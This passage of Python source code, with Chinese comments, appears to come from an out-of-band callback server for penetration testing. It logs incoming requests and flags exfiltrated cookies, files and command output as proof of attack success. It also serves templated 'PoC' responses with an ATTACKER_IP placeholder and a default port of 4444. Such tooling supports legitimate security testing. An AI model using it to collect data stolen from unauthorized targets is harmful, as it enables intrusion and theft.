        delete(PocRule).where(PocRule.id == rule_id, PocRule.token_id == token_id)
    )
    if delete_result.rowcount == 0:
        raise HTTPException(status_code=404, detail="Rule not found")
    
    return {"message": "Rule deleted"}


# ==================== 回调接收端点（公开，无需认证）====================
def replace_variables(content: str, request: Request, client_ip: str, token: str) -> str:
    """替换响应内容中的变量"""
    if not content:
        return content
    
    # 获取请求参数
    query_params = dict(request.query_params)
    
    # 基础变量
    replacements = {
        '{{client_ip}}': client_ip or 'unknown',
        '{{timestamp}}': datetime.utcnow().isoformat(),
        '{{method}}': request.method,
        '{{path}}': str(request.url.path),
        '{{host}}': request.headers.get('host', 'unknown'),
        '{{user_agent}}': request.headers.get('user-agent', 'unknown'),
        '{{callback_url}}': get_callback_url(f"/c/{token}"),
        '{{attacker_ip}}': 'ATTACKER_IP',  # 占位符，用户需自行替换
        '{{attacker_port}}': '4444',  # 默认端口
    }
    
    # 替换基础变量
    for var, value in replacements.items():
        content = content.replace(var, value)
    
    # 替换参数变量 {{param.xxx}}
    param_pattern = r'\{\{param\.(\w+)\}\}'
    for match in re.finditer(param_pattern, content):
        param_name = match.group(1)
        param_value = query_params.get(param_name, '')
        content = content.replace(match.group(0), param_value)
    
    return content


def _normalize_ip(ip: str) -> str:
    """将 IPv4-mapped IPv6 (::ffff:x.x.x.x) 转为纯 IPv4"""
    if ip and ip.startswith('::ffff:'):
        return ip[7:]  # 去掉 '::ffff:'
    return ip or ''


def get_client_ip(request: Request) -> str:
    """
    从请求中获取真实客户端 IP
    
    按优先级检查以下头（考虑不同代理/CDN 的情况）：
    1. CF-Connecting-IP - Cloudflare
    2. X-Real-IP - Nginx 常用配置
    3. True-Client-IP - Akamai, Cloudflare Enterprise
    4. X-Client-IP - 某些代理
    5. X-Forwarded-For - 最常见，取第一个 IP
    6. request.client.host - 直接连接 IP（可能是代理 IP）
    """
    # 按优先级检查各种代理头
    proxy_headers = [
        'CF-Connecting-IP',      # Cloudflare
        'X-Real-IP',             # Nginx
        'True-Client-IP',        # Akamai, Cloudflare Enterprise
        'X-Client-IP',           # 某些代理
    ]
    
    for header in proxy_headers:
        value = request.headers.get(header)
        if value:
            ip = value.split(',')[0].strip()
            if ip:
                return _normalize_ip(ip)
    
    # X-Forwarded-For 特殊处理（格式：client, proxy1, proxy2）
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        ip = forwarded.split(',')[0].strip()
        if ip:
            return _normalize_ip(ip)
    
    # 兜底：直接连接的 IP
    if request.client and request.client.host:
        return _normalize_ip(request.client.host)
    
    return 'unknown'


async def handle_callback(request: Request, token: str, path: str, db: AsyncSession):
    """处理回调请求 - 始终记录所有请求"""
    # 查找 token
    result = await db.execute(
        select(CallbackToken).where(CallbackToken.token == token)
    )
    db_token = result.scalar_one_or_none()
    
    if not db_token:
        return PlainTextResponse("Not Found", status_code=404)
    
    # 过期的 token 仍然记录请求
    is_expired = db_token.expires_at and db_token.expires_at < datetime.utcnow()
    
    # 获取真实客户端 IP
    client_ip = get_client_ip(request)
    
    # 读取请求体
    try:
        body = (await request.body()).decode('utf-8', errors='replace')
    except:
        body = None
    
    headers_dict = dict(request.headers)
    
    # 构建原始请求
    raw_lines = [
        f"{request.method} {request.url.path}{'?' + str(request.url.query) if request.url.query else ''} HTTP/1.1",
        f"Host: {request.headers.get('host', 'unknown')}"
    ]
    for k, v in headers_dict.items():
        if k.lower() != 'host':
            raw_lines.append(f"{k}: {v}")
    raw_lines.append("")
    if body:
        raw_lines.append(body)
    raw_request = "\r\n".join(raw_lines)
    
    # 检测外带数据 (数据回传证明攻击成功)
    query_params = dict(request.query_params)
    is_data_exfil = query_params.get('_exfil') == '1'
    exfil_type = query_params.get('_type') if is_data_exfil else None
    exfil_data = query_params.get('_data') if is_data_exfil else None
    
    # 如果没有 _data 参数，尝试从其他常见参数中获取外带数据
    if is_data_exfil and not exfil_data:
        # 检查其他可能的数据参数
        for key in ['data', 'd', 'c', 'cookie', 'file', 'cmd', 'result']:
            if key in query_params:
                exfil_data = query_params[key]
                break
        # 如果还是没有，检查请求体
        if not exfil_data and body:
            exfil_data = body[:2000]  # 限制长度
    
    # 检测是否命中 PoC 规则路径
    is_poc_hit = path.startswith("p/")
    poc_rule_name = path[2:].split("/")[0] if is_poc_hit else None
    
    # 创建记录
    record = CallbackRecord(
        token_id=db_token.id,
        token=token,
        client_ip=client_ip,
        method=request.method,
        path=f"/{path}" if path else "/",
        query_string=str(request.url.query) if request.url.query else None,
        headers=headers_dict,
        body=body if body else None,
        user_agent=request.headers.get("user-agent"),
        protocol="HTTP",
        raw_request=raw_request,
        # PoC 相关字段
        is_poc_hit=1 if is_poc_hit else 0,
        poc_rule_name=poc_rule_name,
        is_data_exfil=1 if is_data_exfil else 0,
        exfil_data=exfil_data,
        exfil_type=exfil_type
    )
    db.add(record)
    await db.flush()
    
    # 检查是否是 PoC 规则路径 (/p/xxx)
    if path.startswith("p/"):
        rule_name = path[2:].split("/")[0]  # 提取规则名
        rule_result = await db.execute(
            select(PocRule).where(
                PocRule.token_id == db_token.id,
                PocRule.name == rule_name,
                PocRule.is_active == 1
            )
        )
        rule = rule_result.scalar_one_or_none()
        
        if rule:
            # 更新命中次数
            rule.hit_count += 1
            await db.flush()
            
            # 延迟响应
            if rule.delay_ms > 0:
                await asyncio.sleep(rule.delay_ms / 1000)
            
            # 处理重定向
            if rule.redirect_url:
                redirect_url = rule.redirect_url
                if rule.enable_variables:
                    redirect_url = replace_variables(redirect_url, request, client_ip, token)
                return Response(
                    content="",
                    status_code=rule.status_code or 302,
                    headers={"Location": redirect_url}
                )
            
            # 处理响应体
            response_body = rule.response_body or ""
            if rule.enable_variables:
                response_body = replace_variables(response_body, request, client_ip, token)
            
            # 构建响应头
            response_headers = dict(rule.response_headers or {})
            response_headers["Content-Type"] = rule.content_type
            if rule.filename:
                response_headers["Content-Disposition"] = f'inline; filename="{rule.filename}"'
            
            return Response(
                content=response_body,
                status_code=rule.status_code,
                headers=response_headers
            )
        else:
            # PoC 规则路径存在但规则不存在，返回404
            return PlainTextResponse(f"PoC Rule '{rule_name}' not found", status_code=404)
    
    # 默认响应
    if is_expired:
        return PlainTextResponse("Token Expired (but recorded)", status_code=410)
    return PlainTextResponse("OK", status_code=200)
